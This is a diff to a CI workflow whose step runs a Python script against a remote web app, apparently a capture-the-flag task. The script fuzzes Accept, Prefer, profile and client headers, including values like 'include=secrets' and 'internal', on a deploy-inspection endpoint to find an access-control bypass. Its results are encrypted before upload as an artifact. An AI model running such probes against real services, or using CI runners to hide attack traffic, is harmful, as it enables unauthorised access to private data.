@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe HTTP methods on known action endpoint and encrypt responses
+      - name: Probe representation/profile negotiation after preview gate
         shell: bash
         run: |
           set -euo pipefail
@@ -30,21 +30,29 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests,pathlib,urllib.parse,json
+          import requests,pathlib,urllib.parse,json,itertools
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
-          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
-          body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
-          methods=['GET','HEAD','POST','PUT','PATCH','DELETE','OPTIONS','TRACE','CONNECT']
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
+          fixed={'Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          tests=[]
+          accepts=['*/*','application/json','text/plain','text/html','text/x-component','application/x-ndjson','application/problem+json','application/vnd.api+json','application/vnd.launchlet+json','application/vnd.launchlet.preview+json','application/vnd.launchlet.deploy+json','application/vnd.launchlet.deployment+json','application/vnd.launchlet.release+json','application/vnd.launchlet.inspector+json','application/vnd.launchlet.internal+json','application/vnd.launchlet.export+json','application/vnd.launchlet.v1+json','application/vnd.launchlet.actions+json']
+          for a in accepts: tests.append(('accept_'+a,{'Accept':a}))
+          for p in ['return=representation','return=minimal','count=exact','resolution=merge-duplicates','profile=deploy','profile=release','profile=internal','scope=deploy','scope=release','include=internal','include=secrets','respond-async','handling=lenient']:
+              tests.append(('prefer_'+p,{'Prefer':p}))
+          for hn in ['Accept-Profile','Content-Profile','Profile','X-Profile','X-Launchlet-Profile']:
+              for v in ['preview','deploy','deployment','release','production','enterprise','internal','inspector','export','full']:
+                  tests.append((hn+'_'+v,{hn:v}))
+          for hn in ['X-Requested-With','X-Client','X-Client-Type','X-Launchlet-Client']:
+              for v in ['XMLHttpRequest','Launchlet','launchlet-actions/0.9.4','preview','deploy','inspector','internal']:
+                  tests.append((hn+'_'+v,{hn:v}))
+          baseline=s.post(url,headers={**fixed,'Accept':'application/json'},json=body,timeout=15,allow_redirects=False)
           res=[]
-          for m in methods:
-            for variant,b in [('valid',body),('empty',{})]:
-              try:
-                r=s.request(m,url,headers=h,json=b,timeout=15,allow_redirects=False)
-                res.append({'method':m,'variant':variant,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-              except Exception as e:res.append({'method':m,'variant':variant,'error':repr(e)})
-          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          for name,eh in tests:
+              r=s.post(url,headers={**fixed,**eh},json=body,timeout=10,allow_redirects=False)
+              if r.status_code!=baseline.status_code or r.text!=baseline.text:
+                  res.append({'name':name,'sent':eh,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+          (out/'summary.json').write_text(json.dumps({'baseline':{'status':baseline.status_code,'body':baseline.text},'diffs':res},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -60,6 +68,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-methods-encrypted
+          name: launchlet-part2-negotiation-encrypted
           path: artifact/
           retention-days: 1
